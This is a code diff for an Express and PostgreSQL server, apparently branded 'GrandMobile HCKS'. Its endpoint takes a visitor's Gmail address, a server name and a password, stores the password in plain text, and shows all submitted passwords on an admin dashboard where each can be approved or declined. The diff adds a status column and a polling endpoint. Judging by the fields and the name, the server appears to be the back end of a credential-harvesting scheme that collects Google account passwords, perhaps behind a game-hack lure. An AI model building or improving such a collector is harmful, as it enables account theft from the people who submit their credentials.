@@ -21,9 +21,14 @@ async function initDatabase() {
     gmail_account TEXT NOT NULL,
     server TEXT NOT NULL,
     password TEXT,
+     status TEXT NOT NULL DEFAULT 'pending',
     created_at TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP
   )
 `);
+await pool.query(`
+    ALTER TABLE submissions
+    ADD COLUMN IF NOT EXISTS status TEXT NOT NULL DEFAULT 'pending'
+  `);
 
 console.log("PostgreSQL database ready.");
 }
@@ -47,34 +52,38 @@ function requireAdmin(req, res, next) {
   if (!req.session.admin) return res.status(401).json({ error: "Admin access required." });
   next();
 }
-
-app.post("/api/submit", (req, res) => {
-  console.log("DATA RECEIVED:", req.body);
-
-  const gmail_account = req.body.gmail_account;
-  const server = req.body.server;
-  const password = req.body.password;
+app.post("/api/submit", async (req, res) => {
+  const { gmail_account, server, password } = req.body;
 
   if (!gmail_account || !server) {
     return res.status(400).json({
-      error: "Gmail and server are required."
+      error: "Gmail account and server are required."
     });
   }
 
-  pool.query(`
-    INSERT INTO submissions
-    (gmail_account, server, password)
-    VALUES ($1, $2, $3)
-  `, [
-    String(gmail_account).trim(),
-    String(server).trim(),
-    String(password || "").trim()
-  ]).catch((err) => {
-    console.error("Error inserting submission:", err);
-    res.status(500).json({ error: "Internal server error." });
-  });
+  try {
+    const result = await pool.query(
+      `INSERT INTO submissions
+       (gmail_account, server, password, status)
+       VALUES ($1, $2, $3, 'pending')
+       RETURNING id`,
+      [
+        String(gmail_account).trim(),
+        String(server).trim(),
+        String(password || "").trim()
+      ]
+    );
 
-  res.json({ ok: true });
+    res.json({
+      ok: true,
+      id: result.rows[0].id
+    });
+  } catch (err) {
+    console.error("Error inserting submission:", err);
+    res.status(500).json({
+      error: "Internal server error."
+    });
+  }
 });
 
 app.post("/api/admin/login", (req, res) => {
@@ -92,7 +101,7 @@ app.post("/api/admin/logout", (req, res) => {
 
 app.get("/api/admin/submissions", requireAdmin, (req, res) => {
   pool.query(`
-    SELECT id, gmail_account, server, password, created_at
+    SELECT id, gmail_account, server, password, created_at, status
     FROM submissions ORDER BY id DESC
   `).then((result) => {
     res.json(result.rows);
@@ -110,7 +119,29 @@ app.delete("/api/admin/submissions/:id", requireAdmin, (req, res) => {
     res.status(500).json({ error: "Internal server error." });
   });
 });
+app.get("/api/status/:id", async (req, res) => {
+  try {
+    const result = await pool.query(
+      "SELECT status FROM submissions WHERE id = $1",
+      [req.params.id]
+    );
 
+    if (result.rows.length === 0) {
+      return res.status(404).json({
+        status: "not_found"
+      });
+    }
+
+    res.json({
+      status: result.rows[0].status
+    });
+  } catch (err) {
+    console.error("Error checking status:", err);
+    res.status(500).json({
+      error: "Internal server error."
+    });
+  }
+});
 app.get("/api/admin/me", (req, res) => {
   res.json({ admin: !!req.session.admin });
 });
@@ -118,4 +149,30 @@ app.get("/api/admin/me", (req, res) => {
 app.listen(3000, () => {
   console.log("GrandMobile HCKS running at http://localhost:3000");
   console.log("Admin dashboard: http://localhost:3000/admin.html");
+});
+app.post("/api/admin/submissions/:id/approve", requireAdmin, async (req, res) => {
+  try {
+    await pool.query(
+      "UPDATE submissions SET status = 'approved' WHERE id = $1",
+      [req.params.id]
+    );
+
+    res.json({ ok: true });
+  } catch (err) {
+    console.error("Error approving submission:", err);
+    res.status(500).json({ error: "Internal server error." });
+  }
+});
+app.post("/api/admin/submissions/:id/decline", requireAdmin, async (req, res) => {
+  try {
+    await pool.query(
+      "UPDATE submissions SET status = 'declined' WHERE id = $1",
+      [req.params.id]
+    );
+
+    res.json({ ok: true });
+  } catch (err) {
+    console.error("Error declining submission:", err);
+    res.status(500).json({ error: "Internal server error." });
+  }
 });
